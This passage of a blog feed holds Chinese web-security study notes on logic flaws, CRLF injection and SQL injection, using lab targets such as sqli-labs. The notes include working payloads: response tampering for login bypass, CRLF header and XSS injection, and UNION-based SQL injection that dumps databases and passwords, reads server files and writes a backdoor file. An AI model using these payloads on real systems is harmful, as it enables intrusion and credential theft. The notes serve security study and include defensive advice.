bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。</li></ol><p>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。</p><ol><li><p><strong>修改返回包的越权</strong></p><ol><li>修改手机号</li></ol><p>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改</p><p>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过</p><p>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞</p></li><li><p><strong>登录绕过</strong></p><p>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号</p></li><li><p><strong>水平越权</strong></p><ol><li><p>遍历ID</p><p>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题</p></li><li><p>ID替换</p><p>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题</p></li><li><p>垂直越权</p><p>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改</p></li></ol></li></ol><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>采用成熟的权限管理框架（如spring security）</p><p><strong>验证用户是否具有操作数据的权限</strong></p><p>用户进行访问操作的凭证（如用户ID、产品号码、订单流水号等）<strong>优先采用在服务端关联session或加密后放在session中的方式获取</strong></p><p>应对用户凭证（如用户ID、产品号码、订单流水号等）采用难以猜测的构造方式（如随机数）或采用复杂的加密算法加密后再提交</p><p><strong>对管理功能模块进行严格的权限验证</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逻辑漏洞&quot;&gt;&lt;a href=&quot;#逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;逻辑漏洞&quot;&gt;&lt;/a&gt;逻辑漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://www.freebuf.com/vuls/281141.html&quot;&gt;https://</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CRLF注入漏洞（反弹型XSS）</title>
    <link href="https://frankcao3.github.io/posts/12746"/>
    <id>https://frankcao3.github.io/posts/12746</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRLF-注入漏洞"><a href="#CRLF-注入漏洞" class="headerlink" title="CRLF 注入漏洞"></a>CRLF 注入漏洞</h1><p>参考：<a href="https://blog.csdn.net/weixin_44431280/article/details/122869484">https://blog.csdn.net/weixin_44431280/article/details/122869484</a></p><h2 id="CRLF-简介"><a href="#CRLF-简介" class="headerlink" title="CRLF 简介"></a>CRLF 简介</h2><p><strong>CRLF</strong> 指的就是<strong>回车符</strong>（CR，ASCII-13，<code>\r</code>，<code>%0d</code>）和<strong>换行符</strong>（LF，ASCII-10，<code>\n</code>，<code>%0a</code>）</p><p>即<code>%0d%0a</code>。</p><p>操作系统就是通过这个标识进行换行的，相当于我们键盘的回车键。</p><p><strong>HTTP协议中的CRLF</strong>：</p><p>在HTTP协议报文中，请求行与请求头通过一个CRLF（\r\n）隔开，<u><strong>请求头</strong>（header）和<strong>请求正文</strong>（body）之间通过两个CRLF（\r\n）隔开</u>，如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811170742129.png" alt="image-20220811170742129"></p><p>所以，一旦我们通过URL能够控制HTTP 消息头（请求行）中的字符，注入一些恶意的换行，这样我们就能<strong>构造恶意的请求行或请求正文</strong>，注入一些会话Cookie或者HTML代码。所以CRLF Injection又称为<strong>HTTP响应拆分漏洞</strong>HTTP Response Splitting，简称HRS。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="Cookie会话固定"><a href="#Cookie会话固定" class="headerlink" title="Cookie会话固定"></a>Cookie会话固定</h3><p>在URL参数中构造<code>%0d%0aSet-Cookie:crlf=ture</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171140761.png" alt="image-20220811171140761"></p><p>查看HTTP响应包，可以发现HTTP响应头存在了<code>Set-Cookie:crlf=true</code>。因为加入了一个CRLF，所以URL中的一部分内容被作为请求头解析，而$_GET变量接受的URL会直接作为响应头中的Location字段返回。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171158328.png" alt="image-20220811171158328"></p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>如果此时我们在URL中加入<code>%0d%0aSet-Cookie:%20de=a%0d%0a%0d%0a&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，那么服务端返回界面将会如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811172139448.png" alt="image-20220811172139448"></p><p>因为添加了两个CRLF的情况，JS脚本会被识别为HTTP响应正文被浏览器执行，那么就会产生反射性XSS攻击.</p><h2 id="CRLF注入漏洞防护建议"><a href="#CRLF注入漏洞防护建议" class="headerlink" title="CRLF注入漏洞防护建议"></a>CRLF注入漏洞防护建议</h2><ul><li><p>服务端前增加WAF进行防护</p></li><li><p>对用户的数据进行合法性校验，对特殊的字符进行编码，如 &lt;、&gt;、’、”、CR、LF 等，限制用户输入的 CR 和 LF，或者对 CR 和 LF 字符正确编码后再输出，以防止注入自定义 HTTP 头避免输入的数据污染其他 HTTP 首部字段。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRLF-注入漏洞&quot;&gt;&lt;a href=&quot;#CRLF-注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;CRLF 注入漏洞&quot;&gt;&lt;/a&gt;CRLF 注入漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/weixin_4</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://frankcao3.github.io/posts/26401"/>
    <id>https://frankcao3.github.io/posts/26401</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image/resize,w_937,limit_0" alt="SQL注入-小迪安全.png"></p><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的<u>输入参数</u>中的攻击，之后再将这些参数<u>传递给后台的sql服务器加以解析和执行</u>。</p><p>sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p><p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。</p><h2 id="2-产生过程"><a href="#2-产生过程" class="headerlink" title="2. 产生过程"></a>2. 产生过程</h2><p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均<u>提供了可编程的方法来与数据库连接并进行交互</u>。</p><p>如果web应用开发人员无法确保在<u>将从web表单，cookie及输入参数等收到的值传递给sql查询</u>（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够<u>操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</u></p><h2 id="3-常见原因"><a href="#3-常见原因" class="headerlink" title="3. 常见原因"></a>3. 常见原因</h2><p>①转义字符处理不合适；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤多个提交处理不当。 </p><h3 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h3><p>sql数据库将<strong>单引号字符（’）解析成代码与数据间的分界线</strong>：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p><h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><p>数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。</p><p>SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p><p>攻击者利用sql注入漏洞时，通常会<u>尝试访问数据库的元数据</u>，比如<u>内部的数据库和表的名称、列的数据类型和访问权限</u>，例如MySQL服务器的元数据位于<code>information_schema</code>虚拟数据库中，可通过<code>show databases</code>和<code>show tables</code>命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p><h3 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h3><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<u>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值</u>。</p><h3 id="不当的错误处理（盲注）"><a href="#不当的错误处理（盲注）" class="headerlink" title="不当的错误处理（盲注）"></a>不当的错误处理（盲注）</h3><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是<u>将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击</u>。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p><h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p><h2 id="4-危害"><a href="#4-危害" class="headerlink" title="4. 危害"></a>4. 危害</h2><p>盗取网站的数据库敏感信息</p><p>绕过网站后台认证（万能密码：<code>‘ or ‘1’=‘1’ #</code> 登录绕过）</p><p>借助SQL注入漏洞提权获取系统权限</p><p>上传或读取文件</p><p>执行系统命令</p><h2 id="5-MySQL注入流程"><a href="#5-MySQL注入流程" class="headerlink" title="5. MySQL注入流程"></a>5. MySQL注入流程</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142843140.png" alt="image.png"></p><p>以sqli-labs为例：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623816863968-03b39520-736a-4953-9193-393137069010.png" alt="image.png"></p><ul><li><p>查看源码，分析注入原理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>直接传递的变量$id带入sql语句中执行没有做任何的限制。</p></li></ul><h3 id="判断注入点以及注入类型"><a href="#判断注入点以及注入类型" class="headerlink" title="判断注入点以及注入类型"></a>判断注入点以及注入类型</h3><p>在给id赋值时加上其他无意义的字符<code>id=1abc</code>或者<code>id=1 and 1=1</code>、<code>id=1 and 1=2</code>，或者更换闭合条件为单引号<code>1&#39; and 1=1#</code>、 <code>1&#39; and 1=2#</code>之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1&#x3D;1）或者回显为空（解析了and 1&#x3D;2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。</p><p>闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1 </span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1  # 页面回显，正常输出</span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1  # 页面回显，提示错误 </span><br></pre></td></tr></table></figure><h3 id="信息收集（高版本数据库）"><a href="#信息收集（高版本数据库）" class="headerlink" title="信息收集（高版本数据库）"></a>信息收集（高版本数据库）</h3><p><strong>必要知识点:</strong></p><p><em>在<strong>MYSQL5.0以上版本</strong>中，mysql存在一个自带数据库，名为<code>information_ schema</code>，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号”.”代表下一级，比如xiao.user代表数据库xiao中的表user。因此：</em></p><p><code>information_ schema.tables</code>：记录所有表名信息的表</p><p><code>information_ schema.columns</code>：记录所有列名信息的表</p><p><code>table_schema</code>：数据库名</p><p><code>tables_name</code>：表名</p><p><code>column_name</code>：列名</p><p>performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><h4 id="猜解数据库列数（字段数）"><a href="#猜解数据库列数（字段数）" class="headerlink" title="猜解数据库列数（字段数）"></a>猜解数据库列数（字段数）</h4><p>使用<code>order by</code>判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=1 order by 5</span><br></pre></td></tr></table></figure><p>以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/b292dcde41c4abdc906e588bcbd1d9f974c684b0.png@831w_161h_progressive.webp" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/article/f318d092797ad93d870e6043a4349e3383507bac.png@831w_141h_progressive.webp" alt="img"></p><h4 id="判断前端回显"><a href="#判断前端回显" class="headerlink" title="判断前端回显"></a>判断前端回显</h4><p>判断select的哪几个位置会被前端回显，后续查询就在该位置进行。<strong>其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>结果显示2，3的位置会被前端回显。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142202091.png" alt="image-20220726142202091"></p><h4 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select version()</span><br></pre></td></tr></table></figure><h4 id="查询数据库名称"><a href="#查询数据库名称" class="headerlink" title="查询数据库名称"></a>查询数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select database()</span><br></pre></td></tr></table></figure><h4 id="查询数据库用户"><a href="#查询数据库用户" class="headerlink" title="查询数据库用户"></a>查询数据库用户</h4><p>若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user()</span><br></pre></td></tr></table></figure><h4 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version_compile_os</span><br></pre></td></tr></table></figure><p>比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726112454906.png" alt="image-20220726112454906"></p><p>以及数据库名称和版本名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version(),4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726143807180.png" alt="image-20220726143807180"></p><h4 id="查询指定数据库下的表名信息"><a href="#查询指定数据库下的表名信息" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><p>根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助<code>information_ schema.tables</code>查询该数据库的所有表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145018620.png" alt="image-20220726145018620"></p><p>得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。</p><h4 id="查询指定表名下的列名"><a href="#查询指定表名下的列名" class="headerlink" title="查询指定表名下的列名"></a>查询指定表名下的列名</h4><p>根据刚才收集的表名StormGroup_member，查询该表的所有列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= &#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145307736.png" alt="image-20220726145307736"></p><h4 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><p>根据刚才收集的表名、列名，可以查询该表的指定数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145504487.png" alt="image-20220726145504487"></p><p>指定数据可能有多个结果，可以使用<code>limit x,1</code>（从x的位置读取1条记录），变动猜解，得到不同结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1</span><br></pre></td></tr></table></figure><p>得到的密码一般为MD5，去cmd5.com碰撞一下。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145823634.png" alt="image-20220726145823634"></p><h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>MYSQL 注入中首先要明确<strong>当前注入点权限</strong>（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 </p><p>比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。</p><p>imformation_schema除了记录有所有的表名、列名，还有所有的数据库名：</p><p><code>imformation_schema.schemata</code>：记录所有数据库名信息的表（跨库），其中字段<code>schema_name</code>表示数据库名。</p><p><strong>查询的前提是用户具有相应的权限。</strong></p><h4 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155012588.png" alt="image-20220726155012588"></p><h4 id="查询指定数据库下的表名信息-1"><a href="#查询指定数据库下的表名信息-1" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;qqyw&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155117482.png" alt="image-20220726155117482"></p><h4 id="查询指定表名下的列名信息"><a href="#查询指定表名下的列名信息" class="headerlink" title="查询指定表名下的列名信息"></a>查询指定表名下的列名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27; limit 0,1   # 当出现多个记录时，可以使用limit 0,1取第一个记录</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155734752.png" alt="image-20220726155734752"></p><h4 id="查询指定数据-1"><a href="#查询指定数据-1" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,u,p,4 from qqyw.admin    # 查询u,p两列的数据，注意指定admin来自qqyw</span><br></pre></td></tr></table></figure><h3 id="信息收集（低版本数据库）"><a href="#信息收集（低版本数据库）" class="headerlink" title="信息收集（低版本数据库）"></a>信息收集（低版本数据库）</h3><p>暴力查询或结合读取查询</p><ul><li>SQLmap工具——字典dicts.py</li><li>load_file读取源代码的数据库查询语句</li><li>暴力猜解——admin，password，passwd，user，member</li></ul><h3 id="x3D-x3D-文件读写操作-x3D-x3D"><a href="#x3D-x3D-文件读写操作-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;"></a>&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;</h3><ul><li><p>**load_file()**：读取函数，读取文件内容</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160705262.png" alt="image-20220726160705262"></p><p>常见的load_file()读取的敏感信息路径：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,loadfile(&#x27;d:/www.txt&#x27;),3</span><br><span class="line">id=-1 union select 1,load_file(&#x27;C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162851222.png" alt="image-20220726162851222"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163415752.png" alt="image-20220726163415752"></p></li><li><p><strong>into outfile</strong> 或 <strong>into dumpfile</strong> ：上传文件（写入后门、木马）</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160842023.png" alt="image-20220726160842023"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;x&#x27;,3 into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\x.php&#x27;--+</span><br></pre></td></tr></table></figure><p>其中–+用于注释后面的语句，后面有limit 0,1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163809879.png" alt="image-20220726163809879"></p></li></ul><h4 id="文件路径获取"><a href="#文件路径获取" class="headerlink" title="文件路径获取"></a>文件路径获取</h4><p>文件的读写都需要获取到文件路径，路径获取常见方法包括：</p><p><strong>报错显示</strong>：网站报错时，显示的一些路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161419446.png" alt="image-20220726161419446"></p><p><strong>遗留文件</strong>：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161626302.png" alt="image-20220726161626302"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161656508.png" alt="image-20220726161656508"></p><p><strong>报错信息的漏洞</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161808375.png" alt="image-20220726161808375"></p><p><strong>平台配置文件</strong>（不实用）：</p><p>比如在phpStudy中，配置文件C:\phpstudy\PHPTutorial\Apache\conf\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。<br><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162129913.png" alt="image-20220726162129913"></p><p><strong>爆破</strong>：</p><p>PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162408932.png" alt="image-20220726162408932"></p><h4 id="读写问题：魔术引号开关"><a href="#读写问题：魔术引号开关" 